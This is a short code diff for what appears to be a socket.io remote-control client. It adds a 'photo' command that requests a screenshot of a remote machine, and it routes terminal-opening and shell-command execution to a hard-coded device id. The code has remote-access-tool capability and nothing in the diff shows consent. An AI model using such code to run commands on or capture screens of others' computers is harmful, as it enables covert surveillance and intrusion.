@@ -13,6 +13,10 @@ socket.on('system:computer-listing', (executorInfo) => {
 });
 
 
+socket.on('term:error', (error) => {
+    addOutput(error)
+  });
+  
 
 
 
@@ -33,10 +37,14 @@ function handleCommand(command) {
         socket.emit('system:computer-listing', { type: "X-SENDER", command });
     }
 
-    if(command === 'open term'){
-        socket.emit('open:term','-vO-3bBGaJGK7J3oAAAL')
+    if(command === 'photo'){
+        socket.emit('screen:take',{ id: "C02ZPQ76MD6M" })
     }
-    socket.emit('exec:command', { type: "X-SENDER", command });
+
+    if(command === 'open term'){
+        socket.emit('open:term','C02ZPQ76MD6M')
+    }
+    socket.emit('exec:command', { type: "X-SENDER", command , id: "C02ZPQ76MD6M" });
 }
 
 socket.on('response', (result) => {
